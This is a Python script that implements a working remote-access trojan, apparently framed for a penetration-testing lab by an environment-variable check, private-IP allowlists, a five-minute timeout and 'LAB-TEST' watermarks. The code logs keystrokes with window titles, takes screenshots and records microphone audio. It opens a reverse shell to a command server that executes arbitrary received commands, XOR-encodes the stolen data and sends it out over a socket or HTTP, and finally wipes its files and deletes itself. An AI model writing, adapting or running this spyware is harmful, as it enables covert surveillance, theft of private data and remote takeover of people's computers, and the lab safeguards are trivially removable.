import os, sys
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')
if os.environ.get('PENTEST_LAB') != '1':
    sys.exit()
import subprocess, time, datetime, random, base64, json, socket, threading, queue, tempfile, shutil, ctypes, ipaddress, urllib.request, urllib.parse, wave, io, platform

try:
    SCRIPT_PATH = __file__
except NameError:
    SCRIPT_PATH = sys.argv[0]

C2_IP = '192.168.1.100'
C2_PORT = 4443
XOR_KEY = b'16ByteXORKey!!'
HTTP_FALLBACK = 'http://192.168.1.100:8080/exfil'

START_TIME = time.time()
TIMEOUT = 300
stop_event = threading.Event()
data_queue = queue.Queue()
tts_queue = queue.Queue()
c2_lock = threading.Lock()
c2_sock = None
temp_dir = tempfile.mkdtemp(prefix='lab_')

def allowed_ip(ip):
    try:
        return ipaddress.ip_address(ip) in ipaddress.ip_network('192.168.0.0/16') or ipaddress.ip_address(ip) in ipaddress.ip_network('10.0.0.0/8')
    except:
        return False

def allowed_url(url):
    try:
        host = urllib.parse.urlparse(url).hostname
        if host is None:
            return False
        if all(c in '0123456789.' for c in host):
            return allowed_ip(host)
        return allowed_ip(socket.gethostbyname(host))
    except:
        return False

if not allowed_ip(C2_IP) or not allowed_url(HTTP_FALLBACK):
    sys.exit()

def ensure_module(mod, pip=None):
    for _ in range(3):
        try:
            return __import__(mod)
        except ImportError:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--user', pip or mod], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(2)
    try:
        return __import__(mod)
    except ImportError:
        return None

pynput = ensure_module('pynput')
mss = ensure_module('mss')
PIL = ensure_module('PIL')
pyaudio = ensure_module('pyaudio')
pyttsx3 = ensure_module('pyttsx3')
playsound = ensure_module('playsound')
psutil = ensure_module('psutil')

def xor_enc(b):
    if isinstance(b, str):
        b = b.encode()
    return bytes([b[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(b))])

def xor_dec(b):
    return bytes([b[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(b))])

def send_socket(obj):
    global c2_sock
    try:
        data = xor_enc(json.dumps(obj).encode())
        with c2_lock:
            if c2_sock:
                c2_sock.sendall(len(data).to_bytes(4, 'big') + data)
                return True
    except:
        pass
    return False

def send_http(obj):
    try:
        data = json.dumps(obj).encode()
        req = urllib.request.Request(HTTP_FALLBACK, data=data, headers={'X-Lab-Test':'LAB-TEST', 'Content-Type':'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False

def exfil(obj):
    obj['watermark'] = 'LAB-TEST'
    if not send_socket(obj):
        send_http(obj)

def fingerprint():
    info = {'platform': platform.platform(), 'node': platform.node()}
    if psutil:
        try:
            info['cpu'] = psutil.cpu_percent()
            info['mem'] = psutil.virtual_memory().percent
        except:
            pass
    return info

def keylogger():
    if not pynput:
        return
    from pynput.keyboard import Listener, Key
    buf = []
    buf_lock = threading.Lock()
    def on_press(key):
        try:
            k = key.char
        except:
            k = str(key)
        title = ''
        try:
            user32 = ctypes.windll.user32
            h = user32.GetForegroundWindow()
            l = user32.GetWindowTextLengthW(h)
            b = ctypes.create_unicode_buffer(l+1)
            user32.GetWindowTextW(h, b, l+1)
            title = b.value
        except:
            pass
        with buf_lock:
            buf.append((datetime.datetime.now().isoformat(), title, k))
            if len(buf) >= 50:
                data_queue.put({'type':'keylog', 'entries':buf.copy()})
                buf.clear()
    try:
        l = Listener(on_press=on_press)
        l.start()
        while not stop_event.is_set():
            time.sleep(30)
            with buf_lock:
                if buf:
                    data_queue.put({'type':'keylog', 'entries':buf.copy()})
                    buf.clear()
        l.stop()
    except:
        pass

def screenshot():
    if not mss and not PIL:
        return
    while not stop_event.is_set():
        try:
            img = None
            if mss:
                from mss import mss as mss_lib
                with mss_lib() as sct:
                    s = sct.grab(sct.monitors[1])
                    if PIL:
                        from PIL import Image
                        img = Image.frombytes('RGB', s.size, s.bgra, 'raw', 'BGR')
            else:
                from PIL import ImageGrab
                img = ImageGrab.grab()
            if img:
                bio = io.BytesIO()
                img.save(bio, 'JPEG', quality=random.randint(50,70))
                b64 = base64.b64encode(bio.getvalue()).decode()
                data_queue.put({'type':'screenshot', 'data':b64})
        except:
            pass
        time.sleep(random.uniform(30,60))

def audio_capture():
    if not pyaudio:
        return
    CHUNK = 1024
    FMT = pyaudio.paInt16
    CHAN = 1
    RATE = 44100
    while not stop_event.is_set():
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=FMT, channels=CHAN, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            dur = random.uniform(10,20)
            n = int(RATE / CHUNK * dur)
            for _ in range(n):
                if stop_event.is_set():
                    break
                frames.append(stream.read(CHUNK, exception_on_overflow=False))
            stream.stop_stream()
            stream.close()
            p.terminate()
            wav = io.BytesIO()
            wf = wave.open(wav, 'wb')
            wf.setnchannels(CHAN)
            wf.setsampwidth(p.get_sample_size(FMT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            b64 = base64.b64encode(wav.getvalue()).decode()
            data_queue.put({'type':'audio', 'data':b64})
        except:
            pass
        time.sleep(random.uniform(15,30))

def reverse_shell():
    global c2_sock
    while not stop_event.is_set() and time.time() - START_TIME < TIMEOUT:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((C2_IP, C2_PORT))
            with c2_lock:
                c2_sock = s
            send_socket({'watermark':'LAB-TEST','type':'beacon','sys':fingerprint()})
            while not stop_event.is_set():
                length = s.recv(4)
                if not length:
                    break
                length = int.from_bytes(length, 'big')
                cmd_enc = b''
                while len(cmd_enc) < length:
                    chunk = s.recv(length - len(cmd_enc))
                    if not chunk:
                        break
                    cmd_enc += chunk
                if not cmd_enc:
                    break
                cmd = xor_dec(cmd_enc).decode(errors='ignore')
                if any(x in cmd.lower() for x in ['reg add','schtasks','crontab','systemctl','persist','add-','reg delete','schtasks /create']):
                    self_destruct()
                    return
                if cmd.strip() == 'selfdestruct':
                    self_destruct()
                    return
                if cmd.startswith('tts '):
                    tts_queue.put(cmd[4:])
                    out = b'ok'
                elif cmd.startswith('download '):
                    parts = cmd.split(' ', 2)
                    url = parts[1]
                    path = parts[2] if len(parts)>2 else temp_dir+'/dl'
                    try:
                        if allowed_url(url):
                            urllib.request.urlretrieve(url, path)
                            out = ('downloaded '+path).encode()
                        else:
                            out = b'blocked url'
                    except Exception as e:
                        out = str(e).encode()
                else:
                    try:
                        pr = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=30)
                        out = pr.stdout
                    except Exception as e:
                        out = str(e).encode()
                send_socket({'watermark':'LAB-TEST','type':'cmd_out','data':base64.b64encode(out).decode()})
            s.close()
        except:
            pass
        time.sleep(random.uniform(5,60))

def tts_worker():
    if not pyttsx3:
        return
    import pyttsx3
    try:
        engine = pyttsx3.init()
    except:
        return
    while not stop_event.is_set():
        try:
            text = tts_queue.get(timeout=5)
            if text:
                try:
                    wav_path = os.path.join(temp_dir, 'tts.wav')
                    engine.save_to_file(text, wav_path)
                    engine.runAndWait()
                    if playsound:
                        try:
                            playsound.playsound(wav_path)
                        except:
                            pass
                    else:
                        engine.say(text)
                        engine.runAndWait()
                except:
                    pass
        except:
            pass

def exfil_worker():
    while not stop_event.is_set():
        try:
            obj = data_queue.get(timeout=5)
            exfil(obj)
        except:
            pass

def self_destruct():
    if stop_event.is_set():
        return
    stop_event.set()
    try:
        for f in os.listdir(temp_dir):
            p = os.path.join(temp_dir, f)
            try:
                sz = os.path.getsize(p)
                with open(p, 'wb') as ff:
                    ff.write(os.urandom(sz))
            except:
                pass
            try:
                os.remove(p)
            except:
                pass
        shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass
    try:
        os.remove(SCRIPT_PATH)
    except:
        pass
    sys.exit(0)

for t in [keylogger, screenshot, audio_capture, reverse_shell, tts_worker, exfil_worker]:
    th = threading.Thread(target=t, daemon=True)
    th.start()

while not stop_event.is_set() and time.time() - START_TIME < TIMEOUT:
    time.sleep(1)

self_destruct()